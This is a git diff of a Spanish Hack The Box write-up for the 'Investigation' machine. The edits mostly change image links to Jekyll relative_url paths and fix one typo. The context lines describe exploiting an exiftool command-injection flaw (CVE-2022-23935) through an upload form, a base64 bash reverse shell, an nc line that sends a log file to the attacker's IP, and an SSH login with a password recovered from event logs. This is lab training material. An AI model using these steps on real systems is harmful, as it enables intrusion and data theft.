@@ -5,7 +5,7 @@ author: 4akatun
 
 # Writeup
 
-![Investigation0](assets/img/Investigation/investigation.png)
+![Investigation0]({{'assets/img/Investigation/investigation.png' | relative_url}})
 
 HACK-THE-BOX
 
@@ -60,14 +60,14 @@ http://eforenzics.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ]
 Debemos introducir el nombre de dominio **eforenzics.htb** en **/etc/hosts** para que podamos ver la pagina, ya que al poner la ip nos redirige al dicho dominio.
 Luego de ver un poco me encuentro con esta parte.
 
-![upload](assets/img/Investigation/upload_web.png)
+![upload]({{'assets/img/Investigation/upload_web.png' | relative_url}})
 
 Subimos cualquier archivo de imagen para investigar y ver donde nos lleva.
 
 Puedo ver que lo que hace es analizar la foto con **exiftool** y ve la version,
 investigando un poco pudeo ver que la version tiene una vulnerabilidad. 
 
-![exiftool](assets/img/Investigation/exiftool.png)
+![exiftool]({{'assets/img/Investigation/exiftool.png' | relative_url}})
 
 Encuentro esta pagina [CVE-2022-23935.md](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) donde puedo ver informacion
 y como se puede abusar y tener ejecucion remota de comandos.
@@ -76,7 +76,7 @@ Lo compruebo y trabajando desde ***BurpSuite*** empiezo a probar.
 Lanzo primero un *ping* a mi maquina que esta en escucha con **tcpdump**
 para comprobar que efectivamente tengo ejecucion remota de comandos.
 
-![ping](assets/img/Investigation/ping.png)
+![ping]({{'assets/img/Investigation/ping.png' | relative_url}})
 
 Funciona, hora de ejecutar una **reverse-shell** y acceder a la maquina.
 
@@ -89,7 +89,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 Para ello creamos una linea de comandos de reversing en *bash* y lo mandamos en **base 64**
 
-![reverse](assets/img/Investigation/reverse.png)
+![reverse]({{'assets/img/Investigation/reverse.png' | relative_url}})
 
 Conseguimos acceso a la maquina como **www-data**, hacemos tratamiento da la *tty*
 ***Tratamiento  tty***
@@ -139,13 +139,15 @@ www-data@investigation:/usr/local/investigation$ nc 10.10.14.25 1234 < Windows\ 
 ```
 Para abrirlo utilizo el siguiente suitio web.
 [MSG-READER](https://products.aspose.app/email/viewer/msg)
-![.msg](assets/img/Investigation/Windows-logs.png)
+
+![.msg]({{'assets/img/Investigation/Windows-logs.png' | relative_url}})
 
 Veo un mensaje y boton de descarga pero no puedo descargarlo.
 Busco y en el siguiente enlace [encryptomatic](https://www.encryptomatic.com/viewer/) obtengo resultados.
-![descarga-zip](assets/img/Investigation/descarga-zip.png)
 
-Lo descatgo y veo que contiene un archivo de registro de logs de *Windows*
+![descarga-zip]({{'assets/img/Investigation/descarga-zip.png' | relative_url}})
+
+Lo descargo y veo que contiene un archivo de registro de logs de *Windows*
 
 ```bash
 ❯ unzip -l evtx-logs.zip
@@ -161,7 +163,7 @@ Con la siguiente erramienta vuelco su contenido en otro archivo legible y poder 
 ```bash
 ❯ evtxexport security.evtx > security.dump
 ```
-![ssh-key](assets/img/Investigation/ssh-key.png)
+![ssh-key]({{'assets/img/Investigation/ssh-key.png' | relative_url}})
 
 Despues de mucho buscar veo lo que puede ser una contraseña.
 La pruebo con el usuario *smorton* por *ssh*
@@ -212,7 +214,7 @@ smorton@investigation:~$
 Encuantro que, puedo ejecutar como *root* sin proporcionar ninguna contraseña el archivo de nombre *binary*
 Me lo descargo a mi maquina para analizarlo mas en profundidad y ver si pude tener vulnerabilidades.
 
-![binary](assets/img/Investigation/binary_analyze.png)
+![binary]({{'assets/img/Investigation/binary_analyze.png' | relative_url}})
 
 En primer lugar, comprueba si se han enviado tres parámetros de entrada "dos porque el primer parámetro es el nombre del programa mismo".
 En segundo lugar, comprueba si un usuario root lo llama.
